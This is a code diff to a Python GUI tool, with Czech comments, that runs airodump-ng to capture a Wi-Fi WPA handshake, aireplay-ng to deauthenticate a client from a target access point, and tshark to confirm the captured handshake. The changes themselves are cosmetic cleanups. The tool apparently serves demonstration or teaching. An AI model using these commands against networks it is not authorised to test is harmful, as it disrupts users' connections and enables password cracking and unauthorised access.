@@ -53,12 +53,9 @@ def start_handshake_catch():
     interface = global_names.interface
 
     #Příkaz shellu airmon-ng, který budu spouštět v samostatném vlákně
-    command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface} > /dev/null"   # TODO =============
+    command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface} > /dev/null"
 
-    # FOR TESTING ONLY!:
-    #command_catch_handshake = f"sudo airodump-ng -c5 -d CC:2D:E0:C2:EE:6B -w out_handshake wlan1"
-
-    print("COMMAND: " + command_catch_handshake)
+    print("COMMAND: " + command_catch_handshake + "\n")
     
     # Pro názornost vypíšu spouštěný příkaz do labelu
     handshake_command.configure(text=command_catch_handshake)
@@ -72,8 +69,7 @@ def start_handshake_catch():
     global airodump_target_process
     global capture
 
-    print(" -- spuštím airodump na target")
-    # TODO tady je zatím výstup na stdout - později změnit na PIPE
+    #print("     -- spuštím airodump na target")
     airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
     
     #global parse_handshake_cap_thread
@@ -96,7 +92,7 @@ def stop_handshake_catch():
     global airodump_target_process
     if airodump_target_process:
         os.killpg(os.getpgid(airodump_target_process.pid), signal.SIGTERM)
-        print("     -- Process zachytávání handshaku byl ukončen.")
+        print("     -- Process zachytávání handshaku byl ukončen.\n")
 
     global stop_parse_handshake_cap
     stop_parse_handshake_cap = True
@@ -122,18 +118,15 @@ def start_deauthentification():
     ap = global_names.ap
     interface = global_names.interface
 
-    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c {cl} -a {ap} {interface}"
-    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -D -c {cl} -a {ap} {interface} > /dev/null"  # TODO ====================
-    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c BC:1A:E4:92:5E:25 -a CC:2D:E0:C2:EE:6B wlan1"
-    print("COMMAND: " + command_deauth)
+    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -D -c {cl} -a {ap} {interface} > /dev/null"  
+    print("COMMAND: " + command_deauth + "\n")
 
     #Vypíšu pro názornost spouštěný příkaz
     deauth_command_label.configure(text=command_deauth)
 
     # Spouštím proces posílání deauthentifikačních rámců na klienta. Jeho PID si uložím pro pozdější zastavení
     global deauth_process 
-    #deauth_process = subprocess.Popen(command_deauth, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-    deauth_process = subprocess.Popen(command_deauth, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)   # TODO ====================
+    deauth_process = subprocess.Popen(command_deauth, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)  
 
     # Nastavuji správně tlačítka
     deauth_on_button.configure(state=DISABLED) 
@@ -162,9 +155,9 @@ def parse_handshake_cap():
     captured = False
 
     tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" | grep \"Message 4 of 4\""
-    print("COMMAND: "+ tshark_command)
+    print("COMMAND: "+ tshark_command + "\n")
 
-    print("     -- Začínám cyklus čtení " + output_handshake)
+    #print("     -- Začínám cyklus čtení " + output_handshake)
     #print("     -- Captured: " + str(captured))
 
     handshake_finished_label.configure(text="Handshake ještě nebyl zachycen...", text_color='grey')
@@ -188,7 +181,7 @@ def parse_handshake_cap():
             if nlines >= 1:         
                 print("     ------------------------------------------------------")
                 print("     -- HANDSHAKE BYL ZACHYCEN (Captured Message 4 of 4) --")
-                print("     ------------------------------------------------------")
+                print("     ------------------------------------------------------\n")
                 handshake_finished_label.configure(text="Handshake byl zachycen!", text_color='orange')
                 captured = True
                 global_names.finished_tab = 1
@@ -204,10 +197,9 @@ def parse_handshake_cap():
                 deauth_frame.configure(fg_color=("gray75", "gray25"))
 
         except FileNotFoundError:
-            #status.configure(text="File not found. Waiting...")
             print("     -- No file to read...")
         # Kontroluji soubor každou sekundu
-    print("=== DEBUG: Zachycen handshake, ukončuji vlakno ===")
+    #print("=== DEBUG: Zachycen handshake, ukončuji vlakno ===")
 
 # ===========================================================
 def finish():
